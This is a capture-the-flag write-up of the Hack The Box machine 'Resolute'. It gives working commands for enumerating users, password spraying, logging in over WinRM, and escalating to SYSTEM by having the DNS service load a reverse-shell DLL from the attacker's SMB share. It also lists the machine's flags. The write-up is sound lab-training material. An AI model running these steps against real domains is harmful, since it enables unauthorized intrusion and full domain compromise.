# 🧑‍💻 Hack The Box – Resolute

## 📌 Overview
- **Machine Name:** Resolute
- **IP Address(es):** 10.10.10.169
- **Difficulty:** Medium
- **OS:** Windows
- **Tags:** SMB / LDAP / WinRM / Password Spray / PSTranscripts / DNSAdmins / DLL Injection (CVE-2021-40469)
- **Date Completed:** 2025.08.31
- **Status:** ✅ User | ✅ Root

---

## 🖥️ Initial Recon
### Nmap
```zsh
nmap -sC -sV -p- -Pn -oA nmap/resolute 10.10.10.169 -T5
```

**Key findings:**
- Domain: `megabank.local`
- SMB + LDAP + Kerberos → standard AD attack surface
- WinRM (`5985`) open → potential foothold
- DNS service (`53`) present → may matter later

---

## 📂 User Enumeration (Enum4Linux)
```zsh
enum4linux -a 10.10.10.169
```

Leaked description field:
```
Account: marko
Desc: Account created. Password set to Welcome123!
```

- Attempted SMB login with `marko:Welcome123!` → failed.  
- Sprayed password across all users → success with `melanie`.

```zsh
nxc smb RESOLUTE.megabank.local -u users.txt -p 'Welcome123!' --continue-on-success
[+] megabank.local\melanie:Welcome123!
```

---

## 🧭 BloodHound (Phase 1) – Melanie
Collected domain info:
```zsh
bloodhound-ce-python -d megabank.local -u 'melanie' -p 'Welcome123!' -c all -ns 10.10.10.169
```

- No interesting AD privileges.  
- But `melanie` is part of **Remote Management Users** → WinRM login possible.

### Foothold
```zsh
evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
*Evil-WinRM* PS C:\Users\melanie\Desktop> type user.txt
ce03758fb699d836dd40022ba039ef19
```

✅ Initial user shell obtained.

---

## 🔎 Host Enumeration
- **WinPEAS** run → no immediate hits.
- Manual hunt uncovered **C:\PSTranscripts\20191203**.
- Transcript revealed attempted SMB mount with plaintext creds:

```powershell
cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

Confirmed:
```zsh
nxc smb megabank.local -u 'ryan' -p 'Serv3r4Admin4cc123!'
[+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
```

---

## 🧭 BloodHound (Phase 2) – Ryan
- `ryan` is member of **DNSAdmins**.  
- This group can configure the DNS service to load arbitrary DLLs → results in **SYSTEM**.  
- Microsoft acknowledged this as a vuln: **CVE-2021-40469**.

---

## 🚀 Privilege Escalation – DNSAdmins DLL Injection
1. Host malicious DLL (reverse shell):
```zsh
sudo impacket-smbserver share ./
```

2. Configure DNS service to load DLL:
```zsh
dnscmd localhost /config /serverlevelplugindll \\10.10.14.12\share\shell.dll
```

3. Restart DNS service:
```zsh
sc.exe stop dns
sc.exe start dns
```

4. Pop SYSTEM shell:
```zsh
PS C:\Users\Administrator\Desktop> type root.txt
ea306a1e4621b71e2e90c59d27f50d61
```

✅ Domain compromise achieved.

---

## 🏁 Flags
- **User.txt:** `ce03758fb699d836dd40022ba039ef19`
- **Root.txt:** `ea306a1e4621b71e2e90c59d27f50d61`

---

## 🧠 Lessons Learned
**Technical**
- Default onboarding passwords often get reused (password spray worked).  
- PowerShell transcripts (`PSTranscripts`) can leak sensitive data.  
- Membership in **DNSAdmins** is effectively privilege escalation to SYSTEM.  
- DLL injection remains a critical persistence/escalation vector.

**Personal**
- Don’t stop at automated tools; manual log hunting pays off.  
- Default password policies are often a weak link in AD.  
- Always re-check user group memberships after gaining new creds.

**Reusable Techniques**
- Enum4Linux for user/password leaks.  
- Password spraying across all discovered users.  
- Looting PowerShell transcripts for plaintext creds.  
- DNSAdmins DLL injection → SYSTEM (CVE-2021-40469).  
